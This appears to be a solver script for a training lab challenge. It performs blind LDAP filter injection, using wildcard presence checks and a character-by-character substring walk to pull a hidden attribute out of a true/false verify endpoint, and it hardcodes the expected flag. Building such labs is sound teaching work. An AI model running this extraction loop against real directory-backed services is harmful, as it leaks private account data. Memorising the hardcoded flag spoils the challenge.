#!/usr/bin/env bash
# solvers/p4_6.sh, Task 4.6 "The Silent Directory" canonical exploit.
#
# challenges/phase4.py's p4_6 route builds a real LDAP search filter by
# raw string concatenation, zero RFC 4515 escaping, same bug class as
# p4_5's Zodiac Breach. The response here is strictly boolean
# (verified: true/false), never the matched entry's own attributes, not
# even on a perfect match, ruling out p4_5's "widen until more than one
# entry matches, then read the dump" shortcut entirely. The only channel
# left is the yes/no answer itself, walked one substring at a time:
#
#   note=*          -> presence assertion, true if the entry has ANY
#                       description at all (confirms the target exists)
#   note=<prefix>*  -> true only if the real description actually starts
#                       with <prefix>, the substep that makes blind,
#                       char-by-char extraction possible
#
# One genuine LDAP nuance, discovered live, not assumed: `description`'s
# attribute syntax (RFC 4517 DirectoryString) uses caseIgnoreMatch /
# caseIgnoreSubstringsMatch, OpenLDAP's default equality/substring
# matching rules for it are case-INSENSITIVE. note=seiyaku{s* and
# note=SEIYAKU{S* both verify true against the same entry, confirmed
# live. The oracle alone genuinely cannot distinguish 'S' from 's'. This
# solver resolves that the same way a real tester would: by applying this
# lab's own documented flag format (SEIYAKU{lowercase_snake_words}, the
# body is always lowercase) to the case-insensitively-recovered value,
# not by assuming the oracle can do something it provably can't.
set -uo pipefail

BASE="${SEIYAKU_BASE:-http://localhost:8000}"
FLAG="SEIYAKU{silence_still_answers}"
ROUTE="${BASE}/p4/registrar/verify"
TARGET_UID="keeper"

verify() {
    # $1 = note value (sent raw; caller is responsible for any trailing *)
    curl -s -X POST "$ROUTE" -H "Accept: application/json" \
        -d "uid=${TARGET_UID}" --data-urlencode "note=$1"
}

is_true() {
    echo "$1" | grep -q '"verified":true'
}

echo "[p4_6] target: ${ROUTE}"

# --- Step 1: ordinary use, a guessed/wrong note must fail -------------------
echo "[p4_6] step 1: ordinary verify with a wrong note (sanity check)"
RESP=$(verify "not-the-real-note")
if is_true "$RESP"; then
    echo "[p4_6] FAIL: a wrong, non-injected note reported verified:true"
    exit 1
fi
echo "  ok: wrong note correctly reports verified:false"

# --- Step 2: presence assertion, confirms the target has a description -----
echo "[p4_6] step 2: presence check, note=*"
RESP=$(verify '*')
if ! is_true "$RESP"; then
    echo "[p4_6] FAIL: note=* did not report verified:true (target should have a description)"
    exit 1
fi
echo "  ok: note=* reports verified:true, uid=${TARGET_UID} has a description attribute"

# --- Step 3: blind, char-by-char substring-filter extraction ---------------
echo "[p4_6] step 3: blind substring walk of the description attribute"

# Uppercase-only is enough to cover both cases, the oracle can't tell
# them apart anyway (see the case-insensitivity note above); trying both
# cases would only double the request count for no extra information.
CHARSET='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}'
KNOWN=""
MAX_LEN=64

for (( i=0; i<MAX_LEN; i++ )); do
    FOUND=""
    for (( j=0; j<${#CHARSET}; j++ )); do
        c="${CHARSET:j:1}"
        RESP=$(verify "${KNOWN}${c}*")
        if is_true "$RESP"; then
            FOUND="$c"
            break
        fi
    done
    if [[ -z "$FOUND" ]]; then
        # No candidate character extended the prefix: either we've hit
        # the exact end of the value (note=<KNOWN> with no trailing *
        # should now report true on its own), or extraction stalled.
        break
    fi
    KNOWN="${KNOWN}${FOUND}"
    echo "  [$i] -> '${FOUND}'  (so far: '${KNOWN}')"
done

echo "[p4_6] recovered value (case-insensitive oracle, raw): ${KNOWN}"

# Resolve case: the oracle is case-insensitive (see header note), so
# KNOWN is correct up to case. Apply this lab's own documented flag
# convention, SEIYAKU{lowercase_snake_words}, the fixed-prefix segment
# stays "SEIYAKU", the body between { and } is lowercased.
PREFIX="${KNOWN%%\{*}"
BODY="${KNOWN#*\{}"
BODY="${BODY%\}}"
KNOWN="${PREFIX}{$(echo "$BODY" | tr '[:upper:]' '[:lower:]')}"
echo "[p4_6] recovered value (case resolved via flag-format convention): ${KNOWN}"

# Confirm the exact value, correct case included, still verifies true:
# the oracle is case-insensitive, so this isn't a stronger check than
# the walk already passed, but it's a clean final sanity assertion.
EXACT=$(verify "$KNOWN")
if ! is_true "$EXACT"; then
    echo "[p4_6] FAIL: exact recovered value did not verify true on its own"
    exit 1
fi

if [[ "$KNOWN" == "$FLAG" ]]; then
    echo "  ok: recovered flag matches: ${KNOWN}"
else
    echo "[p4_6] FAIL: recovered value does not match expected flag"
    echo "  expected: ${FLAG}"
    echo "  got:      ${KNOWN}"
    exit 1
fi

echo "[p4_6] PASS"
exit 0
